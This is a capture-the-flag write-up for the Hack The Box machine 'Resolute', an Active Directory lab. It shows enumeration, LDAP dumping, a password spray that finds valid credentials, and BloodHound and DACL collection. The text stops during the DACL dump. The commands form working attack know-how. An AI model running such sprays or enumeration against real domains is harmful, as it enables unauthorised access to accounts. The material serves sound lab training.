# Resolute

URL: https://app.hackthebox.com/machines/Resolute

Level: Medium

Date: Sep 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [SMB](#smb)
	- [Password spray](#password-spray)
	- [Windapsearch](#windapsearch)
	- [Got first user](#got-first-user)
- [Shares](#shares)
- [Bloodhound](#bloodhound)
- [User flag](#user-flag)
- [Local Enumeration](#local-enumeration)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Root flag](#root-flag)




## Reconnaissance

### nmap

```bash
$ sudo nmap -p- -T4 -n 10.10.10.169 -oN 01_nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 21:57 CEST
Nmap scan report for 10.10.10.169
Host is up (0.059s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49688/tcp open  unknown
49908/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds
```

more detailed scan only on "juicy" ports:

```bash
$ sudo nmap -p53,88,389,445 -T4 -n 10.10.10.169 -sC -sV -oN 02_nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 21:58 CEST
Nmap scan report for 10.10.10.169
Host is up (0.050s latency).

PORT    STATE SERVICE      VERSION
53/tcp  open  domain       Simple DNS Plus
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-09 20:06:12Z)
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-09-09T13:06:16-07:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h27m19s, deviation: 4h02m31s, median: 7m18s
| smb2-time:
|   date: 2024-09-09T20:06:14
|_  start_date: 2024-09-09T12:24:27
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds
```

so far we have AD domain:

`megabank.local`

let's write in our `/etc/hosts`


### smb

let's loot for SMB shares...

```bash
$ enum4linux megabank.local
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep  9 22:14:10 2024

 =========================================( Target Information )=========================================

Target ........... megabank.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on megabank.local )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for megabank.local )===============================

Looking up status of 10.10.10.169
No reply from 10.10.10.169

 ==================================( Session Check on megabank.local )==================================


[+] Server megabank.local allows sessions using username '', password ''


 ===============================( Getting domain SID for megabank.local )===============================

Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on megabank.local )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for megabank.local from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 ======================================( Users on megabank.local )======================================

index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 ================================( Share Enumeration on megabank.local )================================

do_connect: Connection to megabank.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on megabank.local


 ===========================( Password Policy Information for megabank.local )===========================



[+] Attaching to megabank.local using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:MEGABANK.LOCAL)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 7


 ======================================( Groups on megabank.local )======================================


[+] Getting builtin groups:

group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting builtin group memberships:

Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:

Group: DnsAdmins' (RID: 1101) has member: Couldn't lookup SIDs
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+]  Getting domain group memberships:

Group: 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group: 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group: 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group: 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group: 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group: 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group: 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group: 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group: 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group: 'Domain Users' (RID: 513) has member: MEGABANK\per
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group: 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group: 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group: 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Group: 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group: 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator

 =================( Users on megabank.local via RID cycling (RIDS: 500-550,1000-1050) )=================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ==============================( Getting printer info for megabank.local )==============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Sep  9 22:15:40 2024
```

so far, this is our user's list

```bash
abigail
Administrator
angela
annette
annika
claire
claude
DefaultAccount
felicia
fred
Guest
gustavo
krbtgt
marcus
marko
melanie
MS02$
naoki
paulo
per
ryan
sally
simon
steve
stevie
sunita
ulf
zach
```

(we just remove `krbtgt`, `Administrator`, `DefaultAccount`, `Guest` and machine account `MS02$`)


### password spray

```bash
$ crackmapexec smb 10.10.10.169 -u users  -p users
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:abigail STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:angela STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:annette STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:annika STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:claire STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:claude STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:felicia STATUS_LOGON_FAILURE
..
..
..
```

no luck!

Let's try again with common passwords (`/opt/SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt`)

no luck...

### windapsearch

https://github.com/ropnop/windapsearch

```bash
# apt install python3-ldap

$ git clone https://github.com/ropnop/windapsearch.git
Cloning into 'windapsearch'...
remote: Enumerating objects: 83, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (14/14), done.
Receiving objects: 100% (83/83), 44.61 KiB | 993.00 KiB/s, done.
Resolving deltas: 100% (48/48), done.
remote: Total 83 (delta 0), reused 0 (delta 0), pack-reused 69 (from 1)
```

we can do similar enumeration, but using LDAP instead of SMB

```bash
$ ./windapsearch.py -d megabank.local  -U
[+] No username provided. Will try anonymous bind.
[+] No DC IP provided. Will try to discover via DNS lookup.
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=megabank,DC=local
[+] Attempting bind
[+]     ...success! Binded as:
[+]      None

[+] Enumerating all AD users
[+]     Found 25 users:

cn: Guest

cn: DefaultAccount

cn: Ryan Bertrand
userPrincipalName: ryan@megabank.local

cn: Marko Novak
userPrincipalName: marko@megabank.local

cn: Sunita Rahman
userPrincipalName: sunita@megabank.local

cn: Abigail Jeffers
userPrincipalName: abigail@megabank.local
..
..
..
..
```

let's grab full attributes...

```bash
$ ./windapsearch.py -d megabank.local -U --full -o /home/joshua/Documents/htb/machines/Resolute/ldap/

..
..
..
countryCode: 0
badPasswordTime: 133703881054027842
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132199296443424853
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAaeAGU04VmrOsCGHWeCcAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: naoki
sAMAccountType: 805306368
userPrincipalName: naoki@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local
dSCorePropagationData: 16010101000000.0Z
[*] /home/joshua/Documents/htb/machines/Resolute/ldap//20240909-22:43:32-users.tsv written

[*] Bye!

```

Finally we got some interesting description...

```
$ ./windapsearch.py -d megabank.local  -U --full |grep -i descr
description: Built-in account for guest access to the computer/domain
description: A user account managed by the system.
description: Account created. Password set to Welcome123!
```

### got first user

Apparently, we got first user:

`marko:Welcome123!`

but that credentials aren't working!

```bash
$ crackmapexec smb 10.10.10.169 -u marko -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

maybe we can try same password to ALL users again:

```bash
$ crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

so:

`melanie:Welcome123!`


## Shares

```bash
$ smbmap -u melanie -d megabank.local -p 'Welcome123!' -H 10.10.10.169

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.169:445        Name: megabank.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```


## bloodhound

got data!

```bash
$ bloodhound-python -d megabank.local -v --zip -c All -dc megabank.local -ns 10.10.10.169 -u melanie -p 'Welcome123!'
..
..
..
DEBUG: Write worker is done, closing files
INFO: Done in 00M 11S
INFO: Compressing output into 20240909225434_bloodhound.zip
```

![](attachment/Pasted%20image%2020240909231119.png)


let's display the DACLs of `melanie` by using `dacledit`

```bash
$ python3 examples/dacledit.py -target melanie -dc-ip 10.10.10.169 megabank.local/melanie:'Welcome123!'                       Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*]   ACE[0] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)
[*]     Trustee (SID)             : RAS and IAS Servers (S-1-5-21-1392959593-3013219662-3596683436-553)
[*]   ACE[1] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)
[*]     Trustee (SID)             : RAS and IAS Servers (S-1-5-21-1392959593-3013219662-3596683436-553)
[*]   ACE[2] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Membership (bc0ac240-79a9-11d0-9020-00c04fc2d4cf)
[*]     Trustee (SID)             : RAS and IAS Servers (S-1-5-21-1392959593-3013219662-3596683436-553)
[*]   ACE[3] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : RAS-Information (037088f8-0ae1-11d2-b422-00a0c968f939)
[*]     Trustee (SID)             : RAS and IAS Servers (S-1-5-21-1392959593-3013219662-3596683436-553)
[*]   ACE[4] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : X509-Cert (bf967a7f-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : Cert Publishers (S-1-5-21-1392959593-3013219662-3596683436-517)
[*]   ACE[5] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Token-Groups-Global-And-Universal (46a9b11d-60ae-405a-b7e8-ff8a58d456d2)
[*]     Trustee (SID)             : BUILTIN\Windows Authorization Access Group (S-1-5-32-560)
[*]   ACE[6] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Terminal-Server (6db69a1c-9422-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : BUILTIN\Terminal Server License Servers (S-1-5-32-561)
[*]   ACE[7] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Terminal-Server-License-Server (5805bc62-bdc9-4428-a5e2-856a0f4c185e)
[*]     Trustee (SID)             : BUILTIN\Terminal Server License Servers (S-1-5-32-561)
[*]   ACE[8] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Change-Password (ab721a53-1e2f-11d0-9819-00aa0040529b)
[*]     Trustee (SID)             : Everyone (S-1-1-0)
[*]   ACE[9] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Change-Password (ab721a53-1e2f-11d0-9819-00aa0040529b)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[10] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Send-As (ab721a54-1e2f-11d0-9819-00aa0040529b)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[11] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Receive-As (ab721a56-1e2f-11d0-9819-00aa0040529b)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[12] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : General-Information (59ba2f42-79a2-11d0-9020-00c04fc2d3cf)
[*]     Trustee (SID)             : Authenticated Users (S-1-5-11)
[*]   ACE[13] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Public-Information (e48d0154-bcf8-11d1-8702-00c04fb96050)
[*]     Trustee (SID)             : Authenticated Users (S-1-5-11)
[*]   ACE[14] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Personal-Information (77b5b886-944a-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : Authenticated Users (S-1-5-11)
[*]   ACE[15] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Web-Information (e45795b3-9455-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : Authenticated Users (S-1-5-11)
[*]   ACE[16] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Personal-Information (77b5b886-944a-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[17] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Email-Information (e45795b2-9455-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[18] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Web-Information (e45795b3-9455-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
[*]   ACE[19] info
